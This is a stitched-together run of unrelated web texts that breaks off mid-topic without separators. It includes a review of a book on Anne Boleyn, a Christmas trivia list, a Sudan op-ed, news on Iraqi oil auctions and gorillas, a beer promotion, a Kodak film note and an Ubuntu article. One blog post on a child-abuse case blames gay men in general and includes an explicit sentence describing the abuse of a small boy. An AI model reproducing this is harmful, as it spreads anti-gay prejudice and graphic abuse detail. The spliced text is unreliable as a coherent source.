“ The Lady in the Tower ” glaringly omits any mention of Hilary Mantel ’s “ Wolf Hall , ” this year ’s Man Booker Prize - winning novel , which so ingeniously focuses on the machinations that made Thomas Cromwell the primary architect of Anne Boleyn ’s destruction .
Yet Ms. Mantel provides such a delectably arch portrait of Anne , and stints so deliberately on the clear historical details , that these two books serve as useful companion pieces .
“ Wolf Hall ” is the more impenetrable .
It is also the livelier by far .
“ The Lady in the Tower ” takes its title from one of the many , many pieces of evidence that Ms. Weir holds up for scrutiny .
It comes from a letter of typically shady provenance , since much of the detail surrounding Anne ’s undoing surfaced long after she had been undone .
The letter is addressed “ To the King from the Lady in the Tower , ” and it first surfaced in 1649 .
Some have claimed it was copied by Cromwell from an original letter written by Anne on May 6 , 1536 , while she was imprisoned in the Tower of London .
Historians have long debated the letter ’s authenticity , and they have had ample reason to do so .
Ms. Weir works hard to analyze not only the historians ’ positions but also the essence of the letter itself .
In this instance , which is typical of the book ’s approach , she sets forth various researchers ’ thoughts about whether the letter was in Anne ’s handwriting .
Then she points out that Anne may have been so distraught that she needed to dictate , and that the handwriting issue may not be germane .
( Besides , it might be Cromwell ’s version . )
Then she raises the question of why Cromwell would have held onto this document , “ for why would Cromwell think it desirable to keep a letter from Anne protesting her innocence ? ”
Most interesting , she notes that the “ Lady in the Tower ” locution is odd for a woman who regarded herself to be queen .
And if Anne did not compose this letter , Ms. Weir wonders , who did ?

Some of this book ’s investigatory sojourns are far more palatable than others .
The details surrounding the executions of Anne and her supposed lovers and co-conspirators are at least as ghastly as they are fascinating .
What made beheading the most merciful form of execution ?
What made a sword a better implement for this than an axe ?
Why was an executioner summoned before the trial was even over ?
Did the sword have a groove to accommodate rivulets of blood ?
How long could Anne ’s eyes and lips have kept moving after her head and body parted ways , and for how many seconds might she have suffered pain ?
It takes a hard - core monarchy enthusiast to appreciate Ms. Weir ’s indefatigable pursuit of such information .
[ Congratulations !
This is the first prize winner in our 2009 Christmas Competition .
Merry Christmas one and all ! ]
This list is more completely named : Ten Bizarre Things That You Did Not Know About Christmas ( And Probably Did n’t Want To ) .
I love Christmas , and I love bizarre , morbid , and just plain weird trivia .
I tried to have a varied selection of somewhat obscure trivia in the hopes that you would learn something about Christmas that not only did you not know , but hopefully that you really wish that you STILL did not know .
So , without further ado , the list !
10 Incest , Corpses , and Jesus
What Do Incest , An Embalmed Corpse , And The Baby Jesus Have In Common ?
Most people know that , according to the Bible , the magi brought myrrh as a gift to the infant Jesus , along with gold and frankincense .
Some people also know that myrrh ( dried tree sap ) was used as an embalming ointment or as incense for funerals and cremations ( to mask the smells ) .
Few people know that , according to Ovid ’s Metamorphoses , myrrh trees originated as a result of Myrrha ’s lust for her father , Cinyras .
With the connivance of her nursemaid , Myrrha repeatedly had sex with her unsuspecting father .
When her father realized Myrrha ’s identity and that he had been boinking his daughter , he attempted to kill her but she escaped .
The gods took pity on her and to release her from her shame , turned her into a myrrh tree .
Presumably the Magi did not think to include a gift receipt so that Jesus could return the myrrh , which then became the First Unwanted Christmas Present .
9 Holy Crap !
Everyone has seen a nativity set ; the simplest consist of the baby Jesus , Mary and Joseph and perhaps a few shepherds or animals , while the most extensive contain not just the Holy Family but entire cities with hundreds or thousands of inhabitants .
In parts of Spain , Portugal and Italy one of these figures will often be the caganer .
While traditionally the figure of a Catalan peasant , now it can be any person , Santa Claus , or the devil , so long as they are in the act of defecating .
The caganer is usually placed in a discreet location not in close proximity to the manger .
Presumably this is so as not to contaminate the animals ’ drinking water , one guesses .
8 Dead Kids
Rub-a - dub - dub , Three Dead Kids In A Tub !
Jolly old Saint Nicholas is not only the patron saint of children , but , according to legend , he brought back to life three children after they were murdered and pickled in brine .
Supposedly the three children spent the night at the house of an innkeeper or a butcher , who then killed , gutted , dismembered and pickled the youngsters , and was planning to pass off their remains as pork .
Saint Nicholas happened along and miraculously resuscitated , reassembled , and reanimated the youths .
In art of Saint Nicholas one will sometimes see children standing in vats or tubs ; that would be why !
This legend is also referred to in the French song “ La Légende de Saint Nicolas ” .
No word is available on whether the kids were dill or garlic flavored .
7 Ban It !
Let ’s Celebrate Christmas Like Our Forefathers – By Banning It !
Here in the United States , every year we have our traditional argument over whether or not left - wing liberals , the ACLU , commie agitators , Jews , the government , big business , or any combination thereof are involved in a nefarious plot to “ destroy ” Christmas .
Most proponents of this theory endorse a return to Christmases such as in the olden days , apparently unaware that , from 1659 to 1681 , Christmas was actually banned in Massachusetts .
There were several reasons for this ; the Puritans did not consider December 25 to be a religious day ( if God would have wanted us to celebrate it , then He would have specified that date in the Bible ) , Christmas was celebrated by Catholics and hence was anathema to the Puritans , and , perhaps most importantly , Christmas was not being celebrated by quietly spending the day at home with family or at church , but rather celebrants spent the day “ consumed in Compotations , in Interludes , in playing at Cards , in Revellings , in excess of Wine , in mad Mirth … ” according to the Rev. Increase Mather ( whose joyless visage is pictured above ) .
I suspect that if most Americans were offered the choice of spending Christmas shopping or , as in the days of our forefathers , getting drunk , we ’d return to a “ traditional ” Christmas in less time than it takes Santa to get back up the chimney .
6 Meow
Readers of the site are familiar with Krampus , aka Schmutzli aka Knecht Ruprecht , who is the companion of Saint Nicholas and who punishes the bad children by stuffing them into his sack and taking them to the Black Forest to eat them , to hell , or to the river to drown them .
This charming fellow was discussed in the list and comments of 15 Quite Bizarre Factlets .
While obviously this prospect would be a bit intimidating , at least children can save themselves from an unpleasant fate by good behavior – unlike the unlucky Icelander children .
According to an old Icelandic tradition , everyone has to get one new piece of clothing for Christmas .
Anyone who did not was in danger of being eaten by the Christmas Cat , a large vicious black feline who belonged to a family who were descended from trolls .
( Children who did not behave were eaten by the ogress troll - mother herself . )
Rumor has it that Wal - Mart is considering suggesting that the Christmas Cat had kitties who emigrated around the world , in an attempt to increase next year ’s Christmas clothing sales .
5 Uncle Poop
One of the more unusual bearers of Christmas presents , with a unique delivery method , is the Caga tió ( pooping uncle or , in this case , pooping tree trunk ) .
Found in the Catalonia region , it consists of a hollow log .
Beginning at the Feast of the Immaculate Conception , the family “ feeds ” the tio and covers him with a warm blanket each night .
Then , at Christmas , the family gathers together , sings songs , puts the tio partly into the fire and beats it with sticks , until it excretes presents of candy , nuts or figs .
When the tio is finished pooping it signals this by dropping salted herring , a head of garlic , an onion , or by “ urinating ” , whereupon the entire log is burned .
This is where the expression “ If you do n’t give me a present I ’ll beat the crap out of you ” originated .
4 Wassailing
Wassailing sounds like such an innocuous , wholesome tradition , knocking on doors , singing a few songs , and perhaps being offered a warm drink or cookies .
The original wassailers , however , were more aggressive , and would invade a home , demanding food , drink or money from the homeowners , and refusing to leave until they received their “ recompense ” .
If forcibly ejected they would curse , threaten and sometimes vandalize the property of their “ hosts ” .
Think of some of the later verses from We Wish You a Merry Christmas : “ Now bring us some figgy pudding …. we wo n’t go until we get some . ”
If you are ever the victim of a home invasion you could probably lighten the mood by pointing out the similarity between your attackers and people who sing “ Don we now our gay apparel , fa - la - la - la - la ” .
3 Mari Lwyd
The Old Gray Mare , She Ain’t What She Used To Be .
The Mari Lwyd is a horse ’s skull , decorated with bells and ribbons , which is set on a stick and carried by an operator hidden under a white sheet .
The eye sockets are often filled with green glass and the jaw may be spring - loaded so that the Mari can “ snap ” at passers - by .
She is to be found in Southeast Wales around the Christmas season , particularly at New Year’s .
The Mari and her male companions attempt to enter households or pubs via a contest where they would trade insults with the householders via song ( apparently an early precursor to rap contests ) .
If the Mari and her male friends won , they would enter and obtain food and drink .
The Mari particularly enjoys this because , as the men get drunker and drunker , the Mari begins to appear prettier , younger , thinner , and less dead to them .
2 Castrations and a Cross
Leo V became Byzantine Emperor in 813 after forcing the abdication of Michael I , whereupon Leo had Michael ’s sons castrated .
On Christmas Day in 820 , Leo was praying alone in front of the altar of Hagia Sophia .
A group of conspirators , disguised as priests and monks , and led by Michael the Amorian ( no relation to Michael I ) , entered and drew their daggers to assassinate Leo .
Unarmed and alone , Leo tried to defend himself with an incense burner in one hand and a large wooden cross in the other .
After an hour he succumbed to his injuries , Michael was immediately declared Emperor , and Leo ’s four sons were castrated .
This was not the origin of Christmas tree balls , fortunately .
1 Christmas Question
http://www.youtube.com/watch?v=1khUv74ETHs
Q. What Do You Get A Dead Baby For Christmas ?
A. A Dead Puppy .
The Coventry Carol ( the one which begins Lullay , thou little tiny child , Bye , bye , lully , lullay ) is an old song , dating back to the 15th century .
It was performed in Coventry , England , as part of a Christmas play known as The Pageant of the Shearmen and Tailors , and that particular song refers to the Slaughter of the Innocents .
This , according to the Gospel of Matthew , is when King Herod , fearing the competition from the newborn King of the Jews , sent his soldiers to slaughter all male children in and around Bethlehem who were age two or younger .
In the pageant , the song was sung by the women of Bethlehem to their children to soothe them , right before the soldiers killed them .
It seems to have an odd topic to have survived for so long , but I suspect that department store Santas may be its biggest fans .
[ JFrater : the Coventry Carol is my favorite Christmas Carol , so for your listening pleasure I have included a youtube clip of it above . ]
The Khmer Rouge ’s Pol Pot had hundreds of thousands of people dig their own mass graves before they were beaten to death in Cambodia ’s killing fields .
Rwanda ’s Interahamwe militias used machetes to kill 800,000 people in 100 days .
Now , another low - tech , clandestine approach to orchestrating mass atrocities is being perfected by the ruling National Congress Party , or NCP , in Sudan .
No need for shovels or machetes when you have a box of matches .
Over the last two decades , I ’ve gone to smoldering village after smoldering village in Sudan and the surrounding region , interviewing the survivors of attacks by militias supported by the NCP .
Each time the pattern is the same .
In Darfur , I ’ve sneaked across the border eight times to listen to stories of genocidal attacks carried out by the janjaweed militias .
In southwestern Sudan , I listened to the testimonies of survivors of slave raiding and ethnic cleansing carried out by the murahaleen militias .
In southeastern Sudan , I watched the beginnings of targeted village raids carried out initially by minority “ white army ” ethnic militias .
In northern Uganda , I ’ve driven all over to find escapees who can document the forced recruitment of child soldiers and gruesome killings carried out by the Lord ’s Resistance Army of Joseph Kony .
In each case , militias burned villages by the hundreds , clearing populations from their homes at a rate higher than any other region in the world .
Burning populations out of their areas of origin , usually on the basis of ethnic identity , may require a new terminology in order to fully capture its intent and methodology .
It is , quite simply , state - sponsored pyromania .

In each case in Sudan , the patron of the militias perpetrating most of the human - rights crimes has been the NCP , orchestrating the destruction from Khartoum .
When faced with internal or neighboring opposition to its absolute rule , the NCP has literally set the area in rebellion on fire .
And in each case , it took years for most diplomats and analysts to accept that the primary orchestrator of the violence was indeed the NCP , as it was so difficult to find the “ smoking gun ” evidence .
A new round of village burnings and attacks on civilians has begun in southern Sudan .
Thousands have already been killed and displaced .
Most analyses conclude the causes are tribal .
There is no direct evidence of a hidden hand orchestrating the violence .
But the pattern of past behavior is overwhelmingly strong , and the motive for undertaking such a divide - and - destroy policy again may be more compelling than ever .
The motive ?
A U.S. - brokered peace deal provides for an independence referendum for southern Sudan , which possesses most of the country ’s oil reserves .
The NCP wants to keep the oil and will support militias to burn villages , leading to further divisions and conflict in the south , resulting in the inevitable delay or cancellation of the referendum .
Advertisement
The U.S. response to the current situation is similar to other cases dating back five U.S. presidencies .
Policies are reviewed .
News releases are issued .
Envoys are dispatched .
But the chief diplomatic lesson of the last five administrations remains largely unlearned .
And that is that only when serious and sustained international pressure and credible threats have been applied has the NCP altered its behavior , whether it was ending its support for the slave - raiding militias , its association with Al Qaeda , its aerial bombing in the south or its 20 - year war with southern Sudan ’s rebels .
That strategy is needed now .
But the outlook is not optimistic as the Obama administration announces its new policy on Sudan today .
The review leading up to the final policy recommended the use of a balanced set of incentives and pressures , but the president ’s special envoy says publicly that it is easier to catch bears with honey , and that the equivalent of gold stars , smiley faces and cookies works best to change behavior .
The essential problem with such a policy and with the envoy ’s diplomacy is that neither takes on today ’s fundamental challenge : how to deal with a regime bent on blocking southern Sudan ’s independence referendum and militarily defeating Darfurian rebels , and that does so by attacking civilians and burning villages .
Instead , the envoy is floating alternatives to the southern referendum and pursuing other diplomatic approaches that are damaging to peace efforts .
At five minutes till midnight , the only variable that can prevent a descent into all - out war in Sudan is U.S. global leadership in negotiating a deal for Darfur and ensuring implementation of the referendum for the south .
President Obama must be willing to construct and then utilize the multilateral pressures necessary to achieve these objectives , or Sudan will continue to burn .
“ I ’m treated like public enemy No. 1 , all because I did the right thing , ” Mr. Greenberg , 39 , said .
He is suing the contractors who employed him , Bovis Lend Lease and the John Galt Corporation , accusing them of retaliating against him for telling the truth .
Bovis , in court papers , has denied his claims .
Galt has yet to file its court papers , and declined comment .

But in interviews , a safety inspector from the job , an investigator affiliated with the inquiry by the Manhattan district attorney ’s office , an integrity monitor for the project and several co-workers corroborated much of Mr. Greenberg ’s account , including his safety concerns and the harassment he suffered .
“ They thought he opened his mouth , ” said Rodney Bettis , a fire - watch officer who worked at the building .
He described the abuse Mr. Greenberg suffered as “ pretty constant . ”
Mr. Greenberg entered the construction industry 10 years ago with the help of his father , Harold Greenberg , a notorious figure in the demolition industry who has prior convictions for bribing an inspector and bid rigging .
As an operating engineer , his son , Marshal , was in line for some of the highest paid union jobs in construction .
Initially he worked for his father ’s companies .
In 2005 , when the Deutsche Bank demolition began , a company associated with the elder Mr. Greenberg , Safeway , was hired by Bovis to strip away hazardous materials at the site .
But the company was soon dropped , in part because of concerns about Harold Greenberg ’s role and in part because of an accident at an unrelated construction site .
Bovis replaced Safeway with John Galt , a company that had little experience but whose leaders included two former Safeway executives .
Marshal Greenberg went to work for Galt in 2006 , assigned to operate one of four hoists , or elevators , at the building .
It was the first time he had taken a job outside his father ’s purview .
The demolition of the bank building , which had been heavily damaged in the Sept. 11 terrorist attack , became the most heavily regulated project in the city .
Officials believed the building was filled with a toxic stew of contaminants that would have to be abated before demolition could proceed .
BAGHDAD ( Reuters ) - Critics said the 2003 U.S. invasion of Iraq said was driven by oil , but United States oil majors were largely absent from an Iraqi auction of oil deals snapped up instead by Russian , Chinese and other firms .

Iraqi officials said this proved their independence from U.S. influence and that their two bidding rounds this year for deals to tap Iraq ’s vast oil reserves , the world ’s third largest , were free of foreign political interference .
The Oil Ministry on Saturday ended its second bidding round after awarding seven of the oilfields offered for development , adding to deals from a first auction in June that could together take Iraq up to a capacity to pump 12 million barrels per day .
“ For us in Iraq , it shows the government is fully free from outside influence .
Neither Russia nor America could put pressure on anyone in Iraq -- it is a pure commercial , transparent competition , ” said government spokesman Ali al - Dabbagh .
“ No one , even the United States , can steal the oil , whatever people think . ”
Russia ’s Lukoil on Saturday clinched a deal to develop Iraq ’s supergiant West Qurna Phase
Two oilfield after having failed to convince Iraq to bypass the auction and revive an old Saddam Hussein - era deal for the field .
During a visit to Baghdad earlier this year , Lukoil executives had invited the press to a news conference where they had expected to announce the renewed Saddam deal .
After a few terse comments , they left empty - handed and visibly annoyed .
No U.S. firms bid for fields offered in the second round , and of the four fields bid on by U.S. firms in the first round , only Exxon Mobil won a major prize , leading a group to clinch a deal for the supergiant West Qurna Phase One field .
U.S. - based Occidental came away with a quarter stake in a consortium that won a contract for the giant Zubair field .
By contrast , Chinese state oil firms were involved in every first round bid and made a strong showing in the second .
“ The results of the bid round should lay to rest the old canard that the U.S. intervened in Iraq to secure Iraqi oil for American companies , ” said Philip Frayne , a spokesman at the U.S. embassy in Baghdad .
NO U.S. OIL BONANZA
The results run counter to predictions of some critics of the U.S. ’ 2003 Iraqi invasion , who envisaged domination of Iraqi oil by U.S. oil majors .
“ We have n’t really seen U.S. companies , and that is because of intense competition ...
The issue is financial and technical and not at all political .
This confirms Iraq can manage its oil policy and activities without politicization , ” said Thamir Ghadhban , a prime ministerial advisor and former oil minister .
The terms of Iraq ’s 20 - year oilfield service contracts were seen by analysts as tight , and the legal ambiguity and security issues involved in a country still plagued by bombs and near constant political crisis may be a deterrent for some .
“ The terms are not exactly what everybody had hoped for .
The bids are based on very ambitious assumptions in terms of stability -- the contract terms themselves and collaboration with the local ( state oil ) company and government , ” said a senior executive at a U.S. oil firm who declined to be named .
Foreign state oil firms , less mindful of profit margins than publicly traded firms , and those used to operating in riskier environments such as China ’s CNPC and Angola ’s Sonangol , were heavily represented among bidders for Iraqi fields .
Also , U.S. oil firms already have multi-billion dollar deals to build new refineries in Saudi Arabia , and a presence in the United Arab Emirates and Qatar .
They may not be under as much pressure as other firms to secure a foothold the Middle East .
It ’s getting towards the end of the year , so let ’s have a look back at the top news and items from 2009 in this survey from Marcomill Inc .
Demographics
Over the 4th and 5th of December 2009 1,000 members of the Macromill monitor group completed a private internet - based questionnaire .
The sexes were split exactly 50:50 , and 25.0 % were in their twenties , 25.0 % in their thirties , 25.0 % in their forties , and 25.0 % between 50 and 69 years old .
My top news would be the DPJ ’s victory , the arrest of Ichihashi , and the press reaction to the Noriko Sakai drugs bust .
Top topical items would be the iPhone 3GS ( I ’m surprised it did n’t make it ) , the 1,000 yen toll road traffic jams , and the Odaiba Gundam .
What ’s yours ?
Research results
Over the course of the last few weeks , I have received several requests for an update on the Frank Lombard case .
Lombard is the ( now former )
Duke administrator who was accused last summer of attempting to allow , and even arrange for , strangers he met on the internet to rape his adopted child .
A few days ago , WRAL , a Raleigh - based news station , released an update on the case .
That update is worth re-printing here , along with my commentary , both for what the update says and what it does not say :
“ A former Duke University employee has agreed to plead guilty to a federal charge of sexual exploitation of a minor , authorities said Tuesday . ”
Here , the “ sexual exploitation of a minor ” is not described in any great detail .
That is good because the sexual exploitation Lombard inflicted upon his own child is simply too graphic to reprint fully .
I have read all of the documentation in this case .
It contains descriptions of conduct , which can only be described as sub-human .
“ Frank M. Lombard , 42 , of 24 Indigo Creek Trail in Durham , will enter the plea in federal court in Washington , D.C. , on Dec. 17 , authorities said .
He likely will face 15 years in prison , authorities said . ”
It is interesting that the first demographic mentioned is age , as opposed to race or sexual orientation .
As I proceed with my commentary it may be worthwhile to ask , once again , a question I will ask now :
Is Frank Lombard ’s age the most relevant demographic variable in relation to the charges to which he agreed to plead guilty ?
“ Authorities on Tuesday filed a criminal information in the case , indicating that they were negotiating a plea and did n't want to pursue an indictment against Lombard .
According to the filing , Lombard coerced a minor , identified only as ‘ M.L. , ’ into engaging in sexual conduct so that Lombard could transmit a live video of it over the Internet . ”
And now we have another mention of the “ minor ” followed by the assertion that the criminal information only identifies the minor as “ M.L. ” But WRAL knows precisely what the “ L ” in “ M.L. ” means .
It means Lombard .
It is his adopted black son .
But to acknowledge that “ M.L ” is the son , not daughter , of Frank Lombard is to acknowledge that Lombard is gay .
And the Gods of Diversity frown upon the notion that males can be victims of rape and that the perpetrators can be homosexual men .
And to acknowledge the race of the victim is to suggest that homosexuals might be capable of committing hate crimes , even if they do not play Lacrosse .
Hate crimes legislation is supposed to protect , not prosecute , gay men .
And , finally , there should be no mention ( yet ) that his son was adopted .
The public , when confronted with such information , might use it to form dangerous opinions – such as the opinion that gay men should not be adopting little boys .
According to the news media , the general public is not capable of processing all of this information .
People in the news media are the only ones who can be trusted with all of the benefits ( and responsibilities ) that attach to the full disclosure of information .
“ Lombard was arrested in June after authorities said Washington police caught him in a sting operation soliciting an adult to have sex with his adopted 5 - year - old child . ”
This is certainly odd .
WRAL finally mentions that Frank Lombard ’s child was adopted .
But they fail to mention his sex or his race .
In fact , the way this paragraph is worded , it is not entirely clear that the incident leading to his arrest is the incident leading to the information – or that it led to any formal criminal charges .
So let me clarify this very sloppy portion of the WRAL release .
The child coerced into engaging in sexual conduct on a webcam was Frank Lombard ’s adopted black son .
Lombard performed oral sex on every portion of the little boy ’s body that was capable of expelling human waste .
I hope this clarifies any ambiguity .
I will withhold further details .
“ Duke fired Lombard in July from his position as associate director of the university 's Center for Health Policy . ”
I think we can now see why WRAL has withheld certain relevant information .
Lombard was a high - level administrator in the area of health policy .
To reveal his sexual orientation would raise certain questions , which might violate someone ’s right to feel comfortable at all times .
For example , “ Are certain sexual practices both detrimental to individual health and prevalent in the gay community ? ”
And , “ Could such practices , if widely adopted ( no pun intended ) , be detrimental to the public health ? ”
Finally , “ Is a homosexual man the best candidate available to help run a Center for Public Health and teach a course about AIDS at Duke University ? ”
According to the people at WRAL , and many at Duke University , Frank Lombard is no ordinary white racist .
Nor is he an ordinary white rapist .
He is gay and entitled to special treatment in the court of public opinion .
To refuse to treat him differently would promote hatred and discrimination .
And that would send a dangerous message to small children .
Above all else , we must protect small children from danger .
More than two years after being evacuated following the 2007 killings of their mothers , mountain gorilla babies Ndakasi and Ndeze this week returned home to the Democratic Republic of Congo , moving into a new custom - built forest sanctuary .
The Dec. 1 move was coordinated by the UC Davis - based Mountain Gorilla Veterinary Project , which has been providing veterinary care for the orphans since they were rescued .
" The move was a great success thanks to the tremendous effort of the Mountain Gorilla Veterinary Project staff , and the caretakers and staff from the Congolese wildlife authorities , " said UC Davis wildlife veterinarian Mike Cranfield , who is the Mountain Gorilla Veterinary Project 's executive director and co-director of the Mountain Gorilla One Health Program .
" The orphans will now have the chance to grow up in a safe , healthy environment that is very similar to their natural habitat and close to their surviving family members . "
The Mountain Gorilla One Health Program was established at UC Davis in April with funding from the David and Lucile Packard Foundation .
UC Davis wildlife veterinarian Kirsten Gilardi , co-director of the Mountain Gorilla One Health Program , said it is too soon to know whether the orphans might ever live free .
These two young females and two other orphans are the only mountain gorillas ( Gorilla beringei beringei ) in captivity in the world .
An estimated 750 mountain gorillas survive in the wild .
" Whether or not Ndeze and Ndakasi can be returned to the wild will be the decision of the Congolese wildlife and park authorities , and will depend on the gorillas ' development over the next several years , " Gilardi said .
" Moving them to this new , much more naturalistic setting is certainly a step in the right direction , and a vast improvement for their current well - being . "
Since the 2007 gorilla massacres , the orphans had been living with caretakers in the city of Goma in a makeshift facility run by the Dian Fossey Gorilla Fund International .
While the orphans received excellent care at the Goma facility , its location in the middle of a hot , dusty city directly behind a busy hotel was far from ideal .
A rebel invasion of Virunga National Park delayed the construction of the sanctuary until this year .
The area has now been deemed safe for the gorillas to return .
The orphans ' new home is Senkwekwe Center , built near Virunga National Park headquarters in Rumangabo .
The facility was constructed by the Congolese wildlife authorities ( known locally as the ICCN , for Institut Congolais pour la Conservacion de la Nature ) in part with significant donations from the nonprofit group Canadian Friends of the MVGP .
Named after Ndeze 's silverback father , who was also killed in 2007 , the sanctuary encloses 2.5 acres of natural forest and includes a 1,600 - square - yard interior holding facility where the babies are currently staying .
Under round - the - clock care by ICCN staffers , Ndakasi and Ndeze will be able to explore an environment filled with trees they can climb and planted with native foods they can eat .
" The orphans seemed to adjust to their new surroundings right away , " said Mountain Gorilla Veterinary Project regional veterinary manager Jan Ramer .
" Within 15 minutes they had pulled down a banana tree and started eating it . "
" While it 's a tragedy that gorillas are not able to live in the forest with their families , this facility allows them to live at the right altitude , in the right climate , and among the right vegetation for wild mountain gorillas .
It 's the best place for them right now , " she added .
One of the Mountain Gorilla Veterinary Project 's veterinarians in the Democratic Republic of Congo , Eddy Kambale , will stay with the orphans at Senkwekwe Center for a week to make sure they continue to adjust well to their surroundings .
He and fellow Congolese Mountain Gorilla Veterinary Project veterinarian Jacques Iyanya will also follow up with regular health checks .

Our annual Christmas
Ale is a subtly spiced and sumptuously smooth winter warmer .
This year ’s brew marks the 45th annual release of this Anchor holiday tradition .
Back in 1975 , Anchor released the first holiday beer in America since Prohibition .
Year after year , Anchor creates a new , secret recipe with a unique hand drawn label for their Christmas Ale , but the intent with each brew remains the same : joy for the changing seasons and celebration of the newness of life .
With a heavily guarded , confidential recipe , Christmas Ale is sold only from early November to mid-January .
This highly anticipated seasonal delight is complex and full in flavor , packed with toasty cocoa notes , roasted malts and strong aromas of resinous pine .
Slightly darker than last year ’s Christmas Ale , the 2019 edition is layered with toasted caramel and coffee flavors with subtle hints of Mexican chocolate , rounded out with herbaceous spices .
Crack open a bottle for a spiced whiff of western evergreens , roasted malts , and coastal flowers .
It ’s a rich , round and full bodied - treat with a silky , smooth finish .
As each Christmas
Ale recipe evolves , so does its hand - drawn packaging , created by long - time Anchor Illustrator Jim Stitt , who has created Anchor ’s Christmas
Ale labels every year since 1975 .
Since ancient times , trees have symbolized the winter solstice when the earth , with its seasons , appears born anew .
This year , Stitt illustrated the Western Arborvitae – the “ tree of life ” – across the label .
It is an evergreen conifer native to Northern California , the same region that Anchor has called home for over 123 years .
Before modern medicine , properties of Western Arborvitae leaves were believed to have healing properties – hence , the moniker “ tree of life . ” 2019 Anchor Christmas
Ale proudly wears this tree and symbolizes the start of a strong , healthy beginning .
Kodak Film Number to Film Type Cross Reference Table
What those numbers or letters along the side of the film mean
Table Notes
I take photographs using all types of film .
And when when I turn in a mixed collection of film types for processing unless I take great care in marking the film packages when I get them back from the processor what type of film is in which package is unknown .
This can be a problem when you need to know what type of film was used to do a correct print .
To solve this problem I went to Kodak 's web site and tried to find out what what the number printed on the film meant .
I searched their site and found only three ( single ) references .
So then I wrote Kodak an e-mail from their site asking them if there was a film cross reference table on their web site .
They answered back " no " but sent me four sheets ( 8 pages ) showing the film cross-references .
The data sheets were dated May 1993 .
I then scanned them in saving it as text using my HP scanner .
I received this sheets at no charge in less than 3 days after I sent my e-mail .
Very good service from Kodak .
Note : I reviewed the OCR conversion a few time but there still may be an error or two in this table .
Due to the age of the data sheets I had to manually input in the newer films ( Portra , Ektachrome , TMax and others ) .
Other people have also sent me e-mails noting corrections and additions .
Many thanks to Thomas M. Scarsella of NASA for hundreds of additional entries .

Kodachrome — by Paul Simon
When I think back on all the crap I learned in high school
It 's a wonder I can think at all And though my lack of education has n't hurt me none I can read the writing on the wall Kodachrome , it gives us those nice bright colors Gives us the greens of summers
Makes you think all the world 's a sunny day , oh yeah !
I got a Nikon camera , I love to take a photograph
So momma , do n't take my Kodachrome away
If you took all the girls I knew when I was single And brought 'em all together for one night I know they 'd never match my sweet imagination
And everything looks worse in black and white Kodachrome , it gives us those nice bright colors Gives us the greens of summers
Makes you think all the world 's a sunny day , oh yeah !
I got a Nikon camera , I love to take a photograph
So momma , do n't take my Kodachrome away Momma , do n't take my Kodachrome away Momma , do n't take my Kodachrome away Momma , do n't take my Kodachrome away Momma , do n't take my Kodachrome Momma , do n't take my Kodachrome Momma , do n't take my Kodachrome away Momma , do n't take my Kodachrome
And leave your boy so far from home Momma , do n't take my Kodachrome away Momma , do n't take my Kodachrome Mmmmmm Momma , do n't take my Kodachrome away , okay .
Kodachrome ( code KL ) was introduced in 1935 at ASA 10 .
I understand that at one time Kodak stated that they had no intentions of phasing out Kodachrome 10 .
Well , it was phased out and this is where Paul Simon got the inspiration for the lyrics as I understand it .
In 2002 they phased out Kodachrome 25 .
2007 All Kodachrome was phased out .
At the end of 2010 no more plants will process Kodachrome .
The lyrics was found at http://www.bbhq.com/lyrics.htm#view
You put your money where you gain the most value , instead of spreading it around and feeling unsatisfied as a whole .
Instead of purchasing things that you think you need , but do n’t really end up using on a daily basis , you should put the bulk of your money towards items and services that give you the most value .
The Avocado and the Rice Cooker
The other day , I was trying to pit the avocados and was getting frustrated with trying to get the pit out without ruining the flesh .
I was recounting my story to my friend on the phone later on that night , and she suggested I get an avocado pitter and slicer to make my life easier .
I thought about it and even put it on my list of things to buy .
I later crossed it off because I realized that I would n’t really use it often .
Maybe once a year .
Or less .
Sure , I spend about 5 minutes struggling with the avocados , but is it really worth my money to purchase a utensil that is going to get used once a year or less ?
The answer for me was : No .
And it would clutter up my utensil drawers , which is something I ’d get frustrated with , and end up donating to a friend to get rid of it .
A rice cooker on the other hand , I had deemed to be a worthy purchase and priority .
I eat rice almost every day , and it is a solid staple in my diet .
Buying a rice cooker would save me the time and effort of cooking it in the microwave in a plastic contraption or over the stove , stirring it constantly each day , as well as turning out perfect rice each time ( a big deal with me ) .
So I put my money and my free ( small ) kitchen space towards storing such a bulky item .
So the next time you think you should buy a utensil or contraption to help make your life easier , ask yourself these 3 questions :
Do I have the space and the true need for it ?
How many times a day / week / month / year would I use it ?
Calculate the yearly cost per use ( Price divided by # of times used )
More often than not , I get down to the first and even second question , and realize that I do n’t really need it .
If there 's an upside to the Debian community 's recent attacks on Ubuntu and Mark Shuttleworth it's that there 'll be more conversation between engineers on the two distros .
That 's according to Ubuntu founder Shuttlworth , who believes engineers on major subsystems are now in a better position to talk , which will lead to greater co-ordination in the long term - if not in time for the next releases of Debian and Ubuntu .
Shuttleworth noted the Debian project leaders ' decision to agree to freeze the distro - the basis of Ubuntu - this December and every two years , produced " near panic " in the broad Debian community .
" Panic " is one word .
Debian community members reacted angrily and slammed Ubuntu and Shuttleworth personally for using Debian to further their own commercial interests .
Such was the response , Debian leaders completely reversed their decision to freeze the project this December within 24 - hours , having initially warmly welcomed the idea .
Co-ordination , though , is a long - term issue for Shuttleworth .
He believes in greater " cadence " between Linux distributions and free software projects along " meta cycles " to help design , quality and delivery against a common foe : Microsoft and Windows .
While community members bicker , Microsoft this month will release Windows 7 that should mark a return to business as usual for the software giant following the desktop delivery and uptake hiatus that was Windows Vista .
Shuttleworth called Windows 7 a " wonderful service pack on Vista . "
" What 's been salvaged from that , " Shuttleworth said of the summer flame war , " is to try to have good - quality conversations with the leads of the key subsystems in both Debian and Ubuntu - so things like kernel , X , OpenOffice , Gnome , KDE , the tool chain that define the character of the whole release .
So , while we wo n't have a simultaneous freeze between Debian an Ubuntu for this release we are going to have that process of trying to establish commonalty that will lead to better collaboration and co-ordination and strengthen the overall meta cadence .
" Maybe in four years we 'll have Red Hat join us and have the whole free software system in a two - year cycle - it 'll be amazing ! "
Shuttleworth , meanwhile , plans to take on Window 7 and Microsoft on the server with the Karmic Koala distribution of Ubuntu , due this month , and the follow up Lucid Lynx .
Shuttleworth promised a " conservative " approach on the desktop , but said the Lucid Lynx would make further advances in cloud computing to take advantage of the rapidly changing market .
The goal for Karmic Koala is to be able to deploy an Amazon - compliant cloud across five or 10 servers in 15 minutes , and deploy virtualized resources to either a private or public cloud .
Lucid Lynx will see a " significant amount of evolution " , Shuttleworth promised .
" The cloud stuff is moving so fast it would be inappropriate to lock that down . "
Shuttlworth was speaking during in an interview with Dell cloud computing evangelist Barton George in Austin , Texas , last month .

